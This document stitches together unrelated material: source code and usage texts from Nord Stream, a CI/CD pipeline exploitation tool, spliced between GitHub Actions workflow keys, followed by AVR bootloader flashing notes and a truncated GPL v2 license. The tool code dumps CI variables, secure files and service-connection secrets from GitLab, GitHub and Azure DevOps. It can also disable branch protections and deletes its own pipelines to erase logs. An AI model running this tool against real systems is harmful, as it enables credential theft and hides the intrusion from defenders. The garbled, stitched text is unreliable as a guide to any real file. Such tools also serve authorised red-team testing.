                cookies["_gitlab_session"] = token
            else:
                headers["PRIVATE-TOKEN"] = token

            return (
                requests.get(
                    f"{gitlabURL.strip('/')}/api/v4/user",
                    headers=headers,
                    cookies=cookies,
                    verify=verifyCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
        return False

    def __getLogin(self):
        response = self.getUser()
        return response.get("username", "")

    def getUser(self):
        logger.debug(f"Retrieving user informations")

        return self._session.get(f"{self._gitlabURL}/api/v4/user").json()

    def setCookiesAndHeaders(self):
        if isGitLabSessionCookie(self._token):
            self._session.cookies.update({"_gitlab_session": self._token})
        else:
            self._session.headers.update({"PRIVATE-TOKEN": self._token})

    def __paginatedGet(self, url, params={}):

        params["per_page"] = 100

        res = []

        i = 1
        while True:

            params["page"] = i

            response = self._session.get(url, params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break
                res.extend(response.json())
                i += 1

            else:
                logger.debug(f"Error {response.status_code} while retrieving data: {url}")
                return response.status_code, response.json()

        return response.status_code, res

    def listVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listSecureFilesFromProject(self, project):
        logger.debug("Getting project secure files")
        id = project.get("id")

        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/secure_files")
        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))
            date = time.strftime("%Y-%m-%d_%H-%M-%S")

            for secFile in response:

                date = time.strftime("%Y-%m-%d_%H-%M-%S")
                name = "".join(
                    [c for c in secFile.get("name") if c.isalpha() or c.isdigit() or c in (" ", ".", "-", "_")]
                ).strip()
                fileName = f"securefile_{date}_{name}"

                f = open(f"{path}/{fileName}", "wb")

                content = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{id}/secure_files/{secFile.get('id')}/download"
                )

                # handle large files
                for chunk in content.iter_content(chunk_size=8192):
                    f.write(chunk)
                f.close()

                res.append({"name": secFile.get("name"), "path": f"{path}/{fileName}"})

        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromGroup(self, group):
        id = group.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(group.get("full_path"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromInstance(self):
        res = []
        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/admin/ci/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir("")

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def addProject(self, project=None, filterWrite=False, strict=False):
        logger.debug(f"Checking project: {project}")

        params = {}

        if project != None:
            params["search_namespaces"] = True
            params["search"] = project

        if filterWrite:
            params["min_access_level"] = 30

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                if strict and p.get("path_with_namespace") != project:
                    continue
                p = {
                    "id": p.get("id"),
                    "path_with_namespace": p.get("path_with_namespace"),
                    "name": p.get("name"),
                    "path": p.get("path"),
                }
                self._projects.append(p)

        else:
            logger.error("Error while retrieving projects")
            logger.debug(response)

    def addGroups(self, group=None):
        logger.debug(f"Checking group: {group}")

        params = {"all_available": True}

        if group != None:
            params["search_namespaces"] = True
            params["search"] = group

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                p = {
                    "id": p.get("id"),
                    "full_path": p.get("full_path"),
                    "name": p.get("name"),
                }
                self._groups.append(p)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)

    def __createOutputDir(self, name):
        # outputName = name.replace("/", "_")
        path = f"{self._outputDir}/{name}"
        makedirs(path, exist_ok=True)
        return path

    def waitPipeline(self, projectId):
        logger.info("Getting pipeline output")

        time.sleep(5)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        ).json()

        if response[0].get("status") not in COMPLETED_STATES:
            for i in range(self._maxRetry):
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
                ).json()

                if response[0].get("status") in COMPLETED_STATES:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: pipeline still not finished.")

        return (
            response[0].get("id"),
            response[0].get("status"),
        )

    def __getJobs(self, projectId, pipelineId):

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}/jobs"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # reverse the list to get the first job at the first position
        return response[::-1]

    def downloadPipelineOutput(self, project, pipelineId):
        projectPath = project.get("path_with_namespace")
        self.__createOutputDir(projectPath)

        projectId = project.get("id")

        jobs = self.__getJobs(projectId, pipelineId)

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        f = open(f"{self._outputDir}/{projectPath}/pipeline_{date}.log", "w")

        if len(jobs) == 0:
            return None

        for job in jobs:

            jobId = job.get("id")
            jobName = job.get("name", "")
            jobStage = job.get("stage", "")
            jobStatus = job.get("status", "")

            output = self.__getTraceForJobId(projectId, jobId)

            if jobStatus != "skipped":
                f.write(f"[+] {jobName} (stage={jobStage})\n")
                f.write(output)

        f.close()

        return f"pipeline_{date}.log"

    def __getTraceForJobId(self, projectId, jobId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")

        if response.status_code != 200:
            for i in range(self._maxRetry):
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")
                if response.status_code == 200:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Output still no ready, error !")
                    return None

        return response.text

    def __deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        )

        for pipeline in response:

            # additional checks for non default branches
            # we don't want to remove legitimate logs
            if self._branchName != self._DEFAULT_BRANCH_NAME:
                commitId = pipeline.get("sha")

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/commits/{commitId}"
                ).json()

                if response.get("title") != (Git.ATTACK_COMMIT_MSG and Git.CLEAN_COMMIT_MSG):
                    continue

                if response.get("author_name") != Git.USER:
                    continue

            pipelineId = pipeline.get("id")
            response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}")

    def cleanAllLogs(self, projectId):
        # deleting the pipeline removes everything
        self.__deletePipeline(projectId)

    # not working
    def __cleanEvents(self, projectId):
        logger.debug(f"Deleting events for project: {projectId}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/events", params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for event in response.json():
                    eventId = event.get("id")
                    # don't work
                    response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/events/{eventId}")

                i += 1
            else:
                logger.error("Error while retrieving event")
                logger.debug(response.json())

    def getBranchesProtectionRules(self, projectId):
        logger.debug("Getting branch protection rules")

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{projectId}/protected_branches")

        if status_code == 403:
            raise GitLabError(response.get("message"))

        return response

    def getBranches(self, projectId):
        logger.debug("Getting branch protection rules (limited)")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/branches"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # sometimes GitLab return a 404 and not an empty array
        if status_code == 404:
            project = self.getProject(projectId)

            # if the repo is empty raise an error since there is no branch
            if project.get("empty_repo"):
                raise GitLabError("The project is empty and has no branches.")
            else:
                raise GitLabError("Got 404 for unknown reason.")

        return response

    def getProject(self, projectId):
        logger.debug("Getting project: {projectId}")

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}")

        if response.status_code != 200:
            raise GitLabError(response.json().get("message"))
        else:
            return response.json()

    def getFailureReasonPipeline(self, projectId, pipelineId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}").json()

        return response.get("yaml_errors", None)

    def getFailureReasonJobs(self, projectId, pipelineId):

        res = []
        jobs = self.__getJobs(projectId, pipelineId)

        for job in jobs:

            failure = {}
            failure["name"] = job.get("name", "")
            failure["stage"] = job.get("stage", "")
            failure["failure_reason"] = job.get("failure_reason", "")

            if failure["failure_reason"] != "":
                res.append(failure)

        return res
    branches: [ "main" ]

env: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py devops [options] --token <pat> --org <org> [--project <project> --no-vg --no-gh --no-az --no-aws --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
    nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
    nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --list-secrets [--project <project> --write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           Azure DevOps personal token
    --org <org>                             Org name
    -p, --project <project>                 Run on selected project (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --no-vg                                 Don't extract variable groups secrets
    --no-sf                                 Don't extract secure files
    --no-gh                                 Don't extract GitHub service connection secrets
    --no-az                                 Don't extract Azure service connection secrets
    --no-aws                                Don't extract AWS service connection secrets
    --list-projects                         List all projects.
    --list-secrets                          List all secrets.
    --write-filter                          Filter projects where current user has write or admin access.
    --build-yaml <output>                   Create a pipeline yaml file with default configuration.
    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws
    --describe-token                        Display information on the token
    --branch-name <name>                    Use specific branch name for deployment.
    --pipeline-name <name>                  Use pipeline for deployment.
    --repo-name <name>                      Use specific repo for deployment.

Examples:
    List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.devops import DevOps
from nordstream.core.devops.devops import DevOpsRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)

    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)
    # check validity of the token
    if not DevOps.checkToken(args["--token"], args["--org"]):
        logger.critical("Invalid token or org.")

    # devops setup
    devops = DevOps(args["--token"], args["--org"])
    if args["--output-dir"]:
        devops.outputDir = args["--output-dir"] + "/"
    if args["--branch-name"]:
        devops.branchName = args["--branch-name"]
    if args["--pipeline-name"]:
        devops.pipelineName = args["--pipeline-name"]
    if args["--repo-name"]:
        devops.repoName = args["--repo-name"]

    devopsRunner = DevOpsRunner(devops)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--yaml"]:
        devopsRunner.yaml = args["--yaml"]
    if args["--write-filter"]:
        devopsRunner.writeAccessFilter = args["--write-filter"]

    if args["--no-vg"]:
        devopsRunner.extractVariableGroups = not args["--no-vg"]
    if args["--no-sf"]:
        devopsRunner.extractSecureFiles = not args["--no-sf"]
    if args["--no-az"]:
        devopsRunner.extractAzureServiceconnections = not args["--no-az"]
    if args["--no-gh"]:
        devopsRunner.extractGitHubServiceconnections = not args["--no-gh"]
    if args["--no-aws"]:
        devopsRunner.extractAWSServiceconnections = not args["--no-aws"]
    if args["--no-clean"]:
        devopsRunner.cleanLogs = not args["--no-clean"]

    if args["--describe-token"]:
        devopsRunner.describeToken()
        return

    devopsRunner.getProjects(args["--project"])

    # logic
    if args["--list-projects"]:
        devopsRunner.listDevOpsProjects()

    elif args["--list-secrets"]:
        devopsRunner.listProjectSecrets()

    elif args["--clean-logs"]:
        devopsRunner.manualCleanLogs()

    elif args["--build-yaml"]:
        devopsRunner.output = args["--build-yaml"]
        devopsRunner.createYaml(args["--build-type"])

    else:
        devopsRunner.runPipeline()
  CARGO_TERM_COLOR: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
    nord-stream.py github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--build-type <type> --env <env>]
    nord-stream.py github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections]
    nord-stream.py github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
    nord-stream.py github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
    nord-stream.py github [options] --token <ghp> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <ghp>                           Github personal token
    --org <org>                             Org name
    -r, --repo <repo>                       Run on selected repo (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean workflow logs (default false)
    --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
    --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
    --build-type <type>                     Type used to generate the yaml file can be: default, azureoidc, awsoidc
    --env <env>                             Specify env for the yaml file creation.
    --no-repo                               Don't extract repo secrets.
    --no-env                                Don't extract environnments secrets.
    --no-org                                Don't extract organization secrets.
    --azure-tenant-id <tenant>              Identifier of the Azure tenant associated with the application having federated credentials (OIDC related).
    --azure-subscription-id <subscription>  Identifier of the Azure subscription associated with the application having federated credentials (OIDC related).
    --azure-client-id <client>              Identifier of the Azure application (client) associated with the application having federated credentials (OIDC related).
    --aws-role <role>                       AWS role to assume (OIDC related).
    --aws-region <region>                   AWS region (OIDC related).
    --list-protections                      List all protections.
    --list-repos                            List all repos.
    --list-secrets                          List all secrets.
    --disable-protections                   Disable the branch protection rules (needs admin rights)
    --write-filter                          Filter repo where current user has write or admin access.
    --force                                 Don't check environment and branch protections.
    --branch-name <name>                    Use specific branch name for deployment.
    --describe-token                        Display information on the token

Examples:
    List all secrets from all repositories
    $ nord-stream.py github --token "$GHP" --org myorg --list-secrets

    Dump all secrets from all repositories and try to disable branch protections
    $ nord-stream.py github --token "$GHP" --org myorg --disable-protections

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.github import GitHub
from nordstream.core.github.github import GitHubWorkflowRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitHub.checkToken(args["--token"]):
        logger.critical("Invalid token.")

    # github setup
    gitHub = GitHub(args["--token"])
    if args["--output-dir"]:
        gitHub.outputDir = args["--output-dir"] + "/"
    if args["--org"]:
        gitHub.org = args["--org"]
    if args["--branch-name"]:
        gitHub.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitHub.branchName}"')

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    # runner setup
    gitHubWorkflowRunner = GitHubWorkflowRunner(gitHub, args["--env"])

    if args["--no-repo"]:
        gitHubWorkflowRunner.extractRepo = not args["--no-repo"]
    if args["--no-env"]:
        gitHubWorkflowRunner.extractEnv = not args["--no-env"]
    if args["--no-org"]:
        gitHubWorkflowRunner.extractOrg = not args["--no-org"]
    if args["--yaml"]:
        gitHubWorkflowRunner.yaml = args["--yaml"]
    if args["--disable-protections"]:
        gitHubWorkflowRunner.disableProtections = args["--disable-protections"]
    if args["--write-filter"]:
        gitHubWorkflowRunner.writeAccessFilter = args["--write-filter"]
    if args["--force"]:
        gitHubWorkflowRunner.forceDeploy = args["--force"]
    if args["--aws-role"] or args["--azure-tenant-id"]:
        gitHubWorkflowRunner.exploitOIDC = True
    if args["--azure-tenant-id"]:
        gitHubWorkflowRunner.tenantId = args["--azure-tenant-id"]
    if args["--azure-subscription-id"]:
        gitHubWorkflowRunner.subscriptionId = args["--azure-subscription-id"]
    if args["--azure-client-id"]:
        gitHubWorkflowRunner.clientId = args["--azure-client-id"]
    if args["--aws-role"]:
        gitHubWorkflowRunner.role = args["--aws-role"]
    if args["--aws-region"]:
        gitHubWorkflowRunner.region = args["--aws-region"]
    if args["--no-clean"]:
        gitHubWorkflowRunner.cleanLogs = not args["--no-clean"]

    # logic
    if args["--describe-token"]:
        gitHubWorkflowRunner.describeToken()

    elif args["--list-repos"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubRepos()

    elif args["--list-secrets"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubSecrets()

    elif args["--build-yaml"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.workflowFilename = args["--build-yaml"]
        gitHubWorkflowRunner.createYaml(args["--repo"], args["--build-type"])

    # Cleaning
    elif args["--clean-logs"] or args["--clean-branch-policy"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        if args["--clean-logs"]:
            gitHubWorkflowRunner.manualCleanLogs()
        if args["--clean-branch-policy"]:
            gitHubWorkflowRunner.manualCleanBranchPolicy()

    elif args["--list-protections"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.checkBranchProtections()

    else:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.start()

jobs: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter]
    nord-stream.py gitlab [options] --token <pat> ( --list-groups | --list-projects ) [--project <project> --group <group> --write-filter]
    nord-stream.py gitlab [options] --token <pat> --yaml <yaml> --project <project> [--no-clean]
    nord-stream.py gitlab [options] --token <pat> --clean-logs [--project <project>]
    nord-stream.py gitlab [options] --token <pat> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --url <gitlab_url>                      Gitlab URL [default: https://gitlab.com]
    --ignore-cert                           Allow insecure server connections

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           GitLab personal access token or _gitlab_session cookie
    --project <project>                     Run on selected project (can be a file)
    --group <group>                         Run on selected group (can be a file)
    --list-secrets                          List all secrets.
    --list-protections                      List branch protection rules.
    --list-projects                         List all projects.
    --list-groups                           List all groups.
    --write-filter                          Filter repo where current user has developer access or more.
    --no-project                            Don't extract project secrets.
    --no-group                              Don't extract group secrets.
    --no-instance                           Don't extract instance secrets.
    -y, --yaml <yaml>                       Run arbitrary job
    --branch-name <name>                    Use specific branch name for deployment.
    --clean-logs                            Delete all pipeline logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --describe-token                        Display information on the token

Examples:
    Dump all secrets
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets

    Deploy the custom pipeline on the master branch
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.gitlab import GitLab
from nordstream.core.gitlab.gitlab import GitLabRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitLab.checkToken(args["--token"], args["--url"], (not args["--ignore-cert"])):
        logger.critical('Invalid token or the token doesn\'t have the "api" scope.')

    # gitlab setup
    gitlab = GitLab(args["--url"], args["--token"], (not args["--ignore-cert"]))
    if args["--output-dir"]:
        gitlab.outputDir = args["--output-dir"] + "/"
    gitLabRunner = GitLabRunner(gitlab)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--branch-name"]:
        gitlab.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitlab.branchName}"')

    # config
    if args["--write-filter"]:
        gitLabRunner.writeAccessFilter = args["--write-filter"]
    if args["--no-project"]:
        gitLabRunner.extractProject = not args["--no-project"]
    if args["--no-group"]:
        gitLabRunner.extractGroup = not args["--no-group"]
    if args["--no-instance"]:
        gitLabRunner.extractInstance = not args["--no-instance"]
    if args["--no-clean"]:
        gitLabRunner.cleanLogs = not args["--no-clean"]
    if args["--yaml"]:
        gitLabRunner.yaml = args["--yaml"]

    # logic
    if args["--describe-token"]:
        gitLabRunner.describeToken()

    elif args["--list-projects"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.listGitLabProjects()

    elif args["--list-protections"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.listBranchesProtectionRules()

    elif args["--list-groups"]:
        gitLabRunner.getGroups(args["--group"])
        gitLabRunner.listGitLabGroups()

    elif args["--list-secrets"]:
        if gitLabRunner.extractProject:
            gitLabRunner.getProjects(args["--project"])
        if gitLabRunner.extractGroup:
            gitLabRunner.getGroups(args["--group"])

        gitLabRunner.listGitLabSecrets()

    elif args["--clean-logs"]:
        gitLabRunner.getProjects(args["--project"])
        gitLabRunner.manualCleanLogs()

    else:
        gitLabRunner.getProjects(args["--project"], strict=True)
        gitLabRunner.runPipeline()
    build: 
to build the hex:

make mega2560

To flash the firmware, use avrdude version 5.11 or above

SERIAL_PORT=/dev/tty.usbserial

# erase the chip (necessary before unlocking can happen), then unlock the boot loader area
avrdude -e -c stk500v2 -p m2560 -P $SERIAL_PORT -U lock:w:0x3f:m

# flash the hex file (whatever.hex)
avrdude -v -c stk500v2 -p m2560 -P $SERIAL_PORT  -U flash:w:stk500boot_v2_mega2560.hex

# re-lock the bootloader area of the chip
avrdude -c stk500v2 -p m2560 -P $SERIAL_PORT -U lock:w:0x0f:m

    runs-on: 		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.
                 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

			    Preamble

  The licenses for most software are designed to take away your
freedom to share and change it.  By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users.  This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it.  (Some other Free Software Foundation software is covered by
the GNU Library General Public License instead.)  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
this service if you wish), that you receive source code or can get it
if you want it, that you can change the software or use pieces of it
in new free programs; and that you know you can do these things.

  To protect your rights, we need to make restrictions that forbid
anyone to deny you these rights or to ask you to surrender the rights.
These restrictions translate to certain responsibilities for you if you
distribute copies of the software, or if you modify it.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must give the recipients all the rights that
you have.  You must make sure that they, too, receive or can get the
source code.  And you must show them these terms so they know their
rights.

  We protect your rights with two steps: (1) copyright the software, and
(2) offer you this license which gives you legal permission to copy,
distribute and/or modify the software.

  Also, for each author's protection and ours, we want to make certain
that everyone understands that there is no warranty for this free
software.  If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so
that any problems introduced by others will not reflect on the original
authors' reputations.

  Finally, any free program is threatened constantly by software
patents.  We wish to avoid the danger that redistributors of a free
program will individually obtain patent licenses, in effect making the
program proprietary.  To prevent this, we have made it clear that any
patent must be licensed for everyone's free use or not licensed at all.

  The precise terms and conditions for copying, distribution and
modification follow.

		    GNU GENERAL PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. This License applies to any program or other work which contains
a notice placed by the copyright holder saying it may be distributed
under the terms of this General Public License.  The "Program", below,
refers to any such program or work, and a "work based on the Program"
means either the Program or any derivative work under copyright law:
that is to say, a work containing the Program or a portion of it,
either verbatim or with modifications and/or translated into another
language.  (Hereinafter, translation is included without limitation in
the term "modification".)  Each licensee is addressed as "you".

Activities other than copying, distribution and modification are not
covered by this License; they are outside its scope.  The act of
running the Program is not restricted, and the output from the Program
is covered only if its contents constitute a work based on the
Program (independent of having been made by running the Program).
Whether that is true depends on what the Program does.

  1. You may copy and distribute verbatim copies of the Program's
source code as you receive it, in any medium, provided that you
conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the
notices that refer to this License and to the absence of any warranty;
and give any other recipients of the Program a copy of this License
along with the Program.

You may charge a fee for the physical act of transferring a copy, and
you may at your option offer warranty protection in exchange for a fee.

  2. You may modify your copy or copies of the Program or any portion
of it, thus forming a work based on the Program, and copy and
distribute such modifications or work under the terms of Section 1
above, provided that you also meet all of these conditions:

    a) You must cause the modified files to carry prominent notices
    stating that you changed the files and the date of any change.

    b) You must cause any work that you distribute or publish, that in
    whole or in part contains or is derived from the Program or any
    part thereof, to be licensed as a whole at no charge to all third
    parties under the terms of this License.

    c) If the modified program normally reads commands interactively
    when run, you must cause it, when started running for such
    interactive use in the most ordinary way, to print or display an
    announcement including an appropriate copyright notice and a
    notice that there is no warranty (or else, saying that you provide
    a warranty) and that users may redistribute the program under
    these conditions, and telling the user how to view a copy of this
    License.  (Exception: if the Program itself is interactive but
    does not normally print such an announcement, your work based on
    the Program is not required to print an announcement.)

These requirements apply to the modified work as a whole.  If
identifiable sections of that work are not derived from the Program,
and can be reasonably considered independent and separate works in
themselves, then this License, and its terms, do not apply to those
sections when you distribute them as separate works.  But when you
distribute the same sections as part of a whole which is a work based
on the Program, the distribution of the whole must be on the terms of
this License, whose permissions for other licensees extend to the
entire whole, and thus to each and every part regardless of who wrote it.

Thus, it is not the intent of this section to claim rights or contest
your rights to work written entirely by you; rather, the intent is to
exercise the right to control the distribution of derivative or
collective works based on the Program.

In addition, mere aggregation of another work not based on the Program
with the Program (or with a work based on the Program) on a volume of
a storage or distribution medium does not bring the other work under
the scope of this License.

  3. You may copy and distribute the Program (or a work based on it,
under Section 2) in object code or executable form under the terms of
Sections 1 and 2 above provided that you also do one of the following:

    a) Accompany it with the complete corresponding machine-readable
    source code, which must be distributed under the terms of Sections
    1 and 2 above on a medium customarily used for software interchange; or,

    b) Accompany it with a written offer, valid for at least three
    years, to give any third party, for a charge no more than your
    cost of physically performing source distribution, a complete
